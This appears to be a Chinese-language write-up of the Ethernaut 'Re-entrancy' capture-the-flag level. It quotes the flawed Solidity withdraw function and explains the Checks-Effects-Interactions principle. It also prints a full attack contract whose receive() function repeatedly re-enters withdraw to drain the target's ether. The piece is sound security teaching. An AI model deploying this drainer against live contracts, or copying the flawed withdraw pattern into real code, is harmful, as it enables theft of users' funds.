# Ethernaut-Re-entrancy
Ethernaut Re-entrancy解題思路

<img width="1336" height="1102" alt="image" src="https://github.com/user-attachments/assets/fc5dbb94-8166-4303-9ccc-a41ad5537002" />

***這題是在探討重入攻擊的問題***

主要的問題在於

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

並沒有遵守**Checks-Effects-Interactions的原則**

意思是說在交互之前需要先檢查(Checks)是否符合條件，再來就是要先更新(Effects)會被影響的變數，才能執行交互(Interactions)

像是這一題檢查餘額反而是放在最後才檢查的，所以就會造成只要有攻擊合約一直卡在receive環節就能夠不斷的呼叫target.withdraw()，就會出現攻擊合約盜取目標合約的餘額直到歸零。

  攻擊合約：
    
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.8.0;

    interface IReentrance{
       function donate(address _to) external payable;
       function withdraw(uint256 _amount) external ;
    } 
    
    contract Attacking {
      IReentrance public target;
      constructor(address _targetAddress){
        target=IReentrance(_targetAddress);
    }
      function startAttacking() public payable {
        target.donate{value:msg.value}(address(this));
        target.withdraw(msg.value);
    }
      receive() external payable { 
        if(address(target).balance>0){
            target.withdraw(address(this).balance);
        }
    }
      function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
    }

所以能夠保持Checks-Effects-Interactions這個順序對資安來說就會很重要！！！
